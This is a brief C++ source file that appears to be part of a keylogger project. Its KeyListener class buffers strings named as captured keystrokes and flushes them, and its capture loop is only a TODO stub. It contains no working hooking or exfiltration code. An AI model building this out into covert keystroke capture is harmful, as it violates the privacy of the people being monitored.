//
// Created by Etienne Pasteur on 17/10/2017.
//

#include "KeyListener.hpp"
#include <thread>

KeyListener::~KeyListener()
{

}

void KeyListener::Run()
{
	//TODO: Implementing ContextAgent
	std::this_thread::sleep_until(std::chrono::system_clock::now() + std::chrono::hours((std::numeric_limits<int>::max)()));
}

std::string KeyListener::Flush()
{
	std::string result;
	for (auto const& s : _capturedInputs) { result += s; }
	_capturedInputs.clear();
	return result;
}

void KeyListener::PushKeylog(std::string& keylog)
{
	_capturedInputs.push_back(keylog);
}

KeyListener::KeyListener()
{

}